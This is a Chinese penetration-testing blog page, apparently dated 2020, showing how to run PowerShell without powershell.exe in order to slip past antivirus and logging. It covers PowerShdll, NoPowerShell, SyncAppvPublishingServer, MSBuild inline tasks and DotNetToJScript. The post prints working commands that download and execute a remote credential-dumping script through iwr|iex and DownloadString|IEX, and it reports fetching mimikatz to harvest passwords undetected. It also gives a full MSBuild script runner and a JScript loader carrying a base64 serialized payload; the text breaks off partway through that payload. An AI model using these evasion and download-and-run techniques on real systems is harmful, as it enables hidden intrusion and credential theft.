@@ -1,0 +1,1463 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="人生那个东西，也许只是在一段刻骨铭心之后才算是真正的开始，但有时候想想，徒留遗憾罢了。  文章首发合天智汇，博客备份一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无powershell运行powershell方法总结">
+<meta property="og:url" content="https://lengjibo.github.io/psbypass/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="人生那个东西，也许只是在一段刻骨铭心之后才算是真正的开始，但有时候想想，徒留遗憾罢了。  文章首发合天智汇，博客备份一个">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/0.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/10.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/11.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/12.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/13.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/14.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/15.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/16.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/17.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/18.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/19.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/20.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/psbypass/21.png">
+<meta property="og:updated_time" content="2020-02-27T07:47:45.975Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="无powershell运行powershell方法总结">
+<meta name="twitter:description" content="人生那个东西，也许只是在一段刻骨铭心之后才算是真正的开始，但有时候想想，徒留遗憾罢了。  文章首发合天智汇，博客备份一个">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/psbypass/0.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/psbypass/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>无powershell运行powershell方法总结 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/psbypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">无powershell运行powershell方法总结
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-02-27 15:20:23 / Updated at: 15:47:45" itemprop="dateCreated datePublished" datetime="2020-02-27T15:20:23+08:00">2020-02-27</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>人生那个东西，也许只是在一段刻骨铭心之后才算是真正的开始，但有时候想想，徒留遗憾罢了。</p>
+<hr>
+<p>文章首发合天智汇，博客备份一个</p>
+<a id="more"></a>
+<p>大家好，我是来自鸿鹄实验室的冷逸，今天给大家带来的是，无powershell运行powershell的一些姿势的分享，由于powershell的特性，使得它很受渗透测试爱好者的喜爱，当然也催生了像ASMI之类的防御手段，当然各类杀软也是把它纳入了查杀行列中，比如某套装，只要你调用PS就会查杀，着实恶心。</p>
+<p><img src="../images/psbypass/0.png" alt="image"></p>
+<p>所以我们在与AV的对抗中也会想法设法的去bypass来执行PS，这里我便总结了几种无powershell执行powershell的姿势，希望能在实战的时候帮到大家。<br>下面是总结的列表：</p>
+<ul>
+<li>PowerLine</li>
+<li>PowerShdll </li>
+<li>Nopowershell </li>
+<li>SyncAppvPublishingServer </li>
+<li>调用MSBuild.exe</li>
+<li>调用cscript</li>
+</ul>
+<p>下面的实验如无特殊说明，均在windows server 2008 sp2 + 360最新版下进行</p>
+<h2 id="PowerLine"><a href="#PowerLine" class="headerlink" title="PowerLine"></a>PowerLine</h2><p>PowerLine是一款由c#编写的工具，支持本地命令行调用和远程调用，可以在不直接调用PowerShell的情况下调用PowerShell脚本，优点如下：</p>
+<ul>
+<li>自动识别win7、win10系统</li>
+<li>使用方便,无需复杂的ide</li>
+<li>自动xor编码</li>
+<li>等</li>
+</ul>
+<p>下载地址：<a href="https://github.com/fullmetalcache/PowerLine" target="_blank" rel="noopener">https://github.com/fullmetalcache/PowerLine</a></p>
+<p>我们来看一下它的使用方法：</p>
+<p>首先拉取项目到本地，然后运行build.bat文件</p>
+<p><img src="../images/psbypass/1.png" alt="image"></p>
+<p>然后在UserConf.xml文件中填写你所需要调用的powershell脚本的地址，默认自带powerup、powerview、Mimikatz等，只要按照他给定的格式加入你的ps脚本地址即可</p>
+<p><img src="../images/psbypass/2.png" alt="image"></p>
+<p>加入完成以后，运行PLBuilder.exe进行构建，构建过程中，360无提示</p>
+<p><img src="../images/psbypass/3.png" alt="image"></p>
+<p>查看内置的脚本PowerLine.exe -ShowScripts</p>
+<p><img src="../images/psbypass/4.png" alt="image"></p>
+<p>运行脚本，360无提示</p>
+<p><img src="../images/psbypass/5.png" alt="image"></p>
+<p>但是在运行之后，360提示了报毒，并删掉了我的exe文件…一般AV只是检测PS发出的恶意请求，但由于在powerline中，请求是由powerline发出的，便绕过了一部分AV，但是缺点也是很明显，就是可扩展性太差，所有的功能依赖于配置文件…</p>
+<h2 id="PowerShdll"><a href="#PowerShdll" class="headerlink" title="PowerShdll"></a>PowerShdll</h2><p>这个工具主要使用dll去运行powershell而不需要去连接powershell.exe,所以具有一定的bypassAV能力，当然它也可以在这几个程序下运行rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe或者使用作者给出的单独的exe进行执行</p>
+<p>下载地址：<a href="https://github.com/p3nt4/PowerShdll.git" target="_blank" rel="noopener">https://github.com/p3nt4/PowerShdll.git</a></p>
+<p>exe版使用方法：</p>
+<p>使用PowerShdll -i进入到交互模式，此时便获得了一个交互式的PS环境，可执行任意的powershell命令，整个过程360无拦截</p>
+<p><img src="../images/psbypass/6.png" alt="image"></p>
+<p>下载mimikatz抓取密码，360全程无反应…</p>
+<p><img src="../images/psbypass/7.png" alt="image"></p>
+<p>在交互式模式下唯一要注意的就是，你输入的内容不能过长，否则会出现问题，原因未可知….</p>
+<p>我们再来看一下dll版的用法..</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 PowerShdll.dll,main . &#123; iwr -useb https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1 &#125; ^| iex;</span><br></pre></td></tr></table></figure>
+<p>这次没有那么好运了，直接被360杀了</p>
+<p><img src="../images/psbypass/8.png" alt="image"></p>
+<h2 id="Nopowershell"><a href="#Nopowershell" class="headerlink" title="Nopowershell"></a>Nopowershell</h2><p>NoPowerShell是用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。同时也提供了CS下的cna脚本。<br>优点：</p>
+<ul>
+<li>执行隐秘</li>
+<li>功能强大</li>
+<li>扩展简单</li>
+<li>即使不熟悉PS命令也可以使用cmd命令来代替PS命令，例如(使用ping来代替Test-NetConnection)</li>
+</ul>
+<p>下载地址：<a href="https://github.com/bitsadmin/nopowershell.git" target="_blank" rel="noopener">https://github.com/bitsadmin/nopowershell.git</a></p>
+<p>我们来看一下它的用法：</p>
+<p>直接运行便会输出它的版本和支持的命令</p>
+<p><img src="../images/psbypass/9.png" alt="image"></p>
+<p><img src="../images/psbypass/10.png" alt="image"></p>
+<p>过程360无拦截</p>
+<p>而dll版被秒杀..</p>
+<p><img src="../images/psbypass/11.png" alt="image"></p>
+<p>cs下稳定..</p>
+<p><img src="../images/psbypass/12.png" alt="image"></p>
+<p>这里要注意一点的是，脚本默认调用scripts下的文件，国内的cs大多为script目录，自行修改文件内的目录即可</p>
+<h2 id="SyncAppvPublishingServer"><a href="#SyncAppvPublishingServer" class="headerlink" title="SyncAppvPublishingServer"></a>SyncAppvPublishingServer</h2><p>SyncAppvPublishingServer是win10自带的服务，有vbs和exe两个版本，我们可以使用他们来做一些类似PS的操作</p>
+<p>默认存放在C:\Windows\System32下面</p>
+<p><img src="../images/psbypass/13.png" alt="image"></p>
+<p>用法实例：</p>
+<p>弹计算机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\SyncAppvPublishingServer.vbs &quot;Break; Start-Process Calc.exe ”</span><br></pre></td></tr></table></figure>
+<p><img src="../images/psbypass/14.png" alt="image"></p>
+<p>或者：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\SyncAppvPublishingServer.vbs &quot;Break; iwr http://192.168.1.149:443&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/psbypass/15.png" alt="image"></p>
+<p>你也可以去远程下载执行一些ps脚本就像下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\SyncAppvPublishingServer.exe \&quot; Break; (New-Object System.Net.WebClient).DownloadFile(&apos;https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1&apos;,&apos;$env:USERPROFILE/1.ps1&apos;); Start-Process &apos;$env:USERPROFILE/1.ps1&apos; -WindowStyle Minimized;&quot;</span><br><span class="line"></span><br><span class="line">SyncAppvPublishingServer.exe &quot;n;(New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1&apos;) | IEX&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="调用MSBuild-exe："><a href="#调用MSBuild-exe：" class="headerlink" title="调用MSBuild.exe："></a>调用MSBuild.exe：</h2><p>MSBuild是.Net框架中包含的工具，用于自动化创建软件产品的过程，包括编译源代码，打包，测试，部署和创建文档。</p>
+<p>Msbuild依赖于.csproj文件，该文件具有XML语法，包含了.NET构建过程中的结果，类似于unix中的make，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion=&quot;4.0&quot;</span><br><span class="line">xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;</span><br><span class="line">&lt;Target Name=&quot;MSPSLess&quot;&gt;</span><br><span class="line">&lt;/Target&gt;</span><br><span class="line">&lt;PSLess/&gt;</span><br><span class="line">&lt;UsingTask TaskName=&quot;PSLess&quot; TaskFactory=&quot;CodeTaskFactory&quot;</span><br><span class="line">AssemblyFile=</span><br><span class="line">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">&lt;Task&gt;</span><br><span class="line">&lt;Code Type=&quot;Class&quot; Lang=&quot;cs&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">using System.Collections.ObjectModel;</span><br><span class="line">using System.Management.Automation;</span><br><span class="line">using System.Management.Automation.Runspaces;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using System.IO;</span><br><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using Microsoft.Build.Framework;</span><br><span class="line">using Microsoft.Build.Utilities;</span><br><span class="line">public class PSLess :  Task</span><br><span class="line">&#123;</span><br><span class="line">  public override bool Execute()</span><br><span class="line">  &#123;</span><br><span class="line">   string buffer = &quot;&quot;;</span><br><span class="line">   try</span><br><span class="line">   &#123;</span><br><span class="line">     buffer = File.ReadAllText(&quot;c:/test/test.ps1&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   catch (Exception e)</span><br><span class="line">   &#123;</span><br><span class="line">    Console.WriteLine(&quot;error:&quot; +e.Message);</span><br><span class="line">    Environment.Exit(2);</span><br><span class="line">   &#125;</span><br><span class="line">   buffer=RunScript(buffer);</span><br><span class="line">   Console.WriteLine(buffer);</span><br><span class="line">   return true;</span><br><span class="line"> &#125;</span><br><span class="line"> private static string RunScript(string script)</span><br><span class="line">  &#123;</span><br><span class="line">    Runspace MyRunspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    MyRunspace.Open();</span><br><span class="line">    Pipeline MyPipeline = MyRunspace.CreatePipeline();</span><br><span class="line">    MyPipeline.Commands.AddScript(script);</span><br><span class="line">    MyPipeline.Commands.Add(&quot;Out-String&quot;);</span><br><span class="line">    Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke();</span><br><span class="line">    MyRunspace.Close();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    foreach (PSObject pobject in outputs)</span><br><span class="line">    &#123;</span><br><span class="line">      sb.AppendLine(pobject.ToString());</span><br><span class="line">    &#125;</span><br><span class="line">    return sb.ToString();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">]]&gt;</span><br><span class="line">&lt; / Code&gt;</span><br><span class="line">&lt;/Task&gt;</span><br><span class="line">&lt;/UsingTask&gt;</span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure>
+<p>test.ps1的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hello from powershell-less&quot;</span><br><span class="line">echo &quot;this is your pid:$PID&quot;</span><br><span class="line">$psversiontable</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="../images/psbypass/16.png" alt="image"></p>
+<p>全程360无提示..</p>
+<p>github上也有类似的项目：<a href="https://github.com/Cn33liz/MSBuildShell.git" target="_blank" rel="noopener">https://github.com/Cn33liz/MSBuildShell.git</a></p>
+<p>执行完之后获得一个交互式的PS</p>
+<p><img src="../images/psbypass/17.png" alt="image"></p>
+<h2 id="调用cscript："><a href="#调用cscript：" class="headerlink" title="调用cscript："></a>调用cscript：</h2><p>github上有一个开源的项目<a href="https://github.com/tyranid/DotNetToJScript，可以直接生产一个.js的文件，用法是" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript，可以直接生产一个.js的文件，用法是</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dotnettojscript.exe &lt;path_of_assembly&gt; &gt; testps.js</span><br></pre></td></tr></table></figure>
+<p>现在作者给出来编译好的版本，但是里面总是有一些问题总是提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error: loading assembly information.</span><br><span class="line">The generated script might not work correctly</span><br></pre></td></tr></table></figure>
+<p>所以我们下载下来，进行手动编译..</p>
+<p>首先使用vs打开项目，然后切换到TestClass.cs，并注释掉MessageBox这个方法，不然每次运行都会得到一个messageBox</p>
+<p><img src="../images/psbypass/18.png" alt="image"></p>
+<p>然后，因为需要调用PS，所以我们需要引入”System.Management.Automation.Runspaces”，“ System.Management.Automation“，我们可以在PS下使用下面的命令进行查询该dll的位置，然后手动引入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[psobject].Assembly.Location</span><br></pre></td></tr></table></figure>
+<p><img src="../images/psbypass/19.png" alt="image"></p>
+<p>引入之后，并且在TestClass中加入以下方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private string LoadScript(string filename)</span><br><span class="line"> &#123;</span><br><span class="line">    string buffer =&quot;&quot;;</span><br><span class="line">    try &#123;</span><br><span class="line">        buffer = File.ReadAllText(filename);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">       return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return buffer;</span><br><span class="line"> &#125;</span><br><span class="line"> public void RunScript(string filename)</span><br><span class="line"> &#123;</span><br><span class="line">    Runspace MyRunspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    MyRunspace.Open();</span><br><span class="line">    Pipeline MyPipeline = MyRunspace.CreatePipeline();</span><br><span class="line">    string script=LoadFile(filename);</span><br><span class="line">    MyPipeline.Commands.AddScript(script);</span><br><span class="line">    MyPipeline.Commands.Add(&quot;Out-String&quot;);</span><br><span class="line">    Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke();</span><br><span class="line">    MyRunspace.Close();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    foreach (PSObject pobject in outputs)</span><br><span class="line">    &#123;</span><br><span class="line">      sb.AppendLine(pobject.ToString());</span><br><span class="line">    &#125;</span><br><span class="line">    Console.WriteLine(sb.ToString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译完得到Dotnettojscript.exe、ExampleAssembly.dll两个文件，然后我们继续将我们的test.ps1文件进行生成一个js文件，<br>其内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">function setversion() &#123;</span><br><span class="line">&#125;</span><br><span class="line">function debug(s) &#123;&#125;</span><br><span class="line">function base64ToStream(b) &#123;</span><br><span class="line">	var enc = new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);</span><br><span class="line">	var length = enc.GetByteCount_2(b);</span><br><span class="line">	var ba = enc.GetBytes_4(b);</span><br><span class="line">	var transform = new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);</span><br><span class="line">	ba = transform.TransformFinalBlock(ba, 0, length);</span><br><span class="line">	var ms = new ActiveXObject(&quot;System.IO.MemoryStream&quot;);</span><br><span class="line">	ms.Write(ba, 0, (length / 4) * 3);</span><br><span class="line">	ms.Position = 0;</span><br><span class="line">	return ms;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var serialized_obj = &quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+</span><br><span class="line">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+</span><br><span class="line">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+</span><br><span class="line">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+</span><br><span 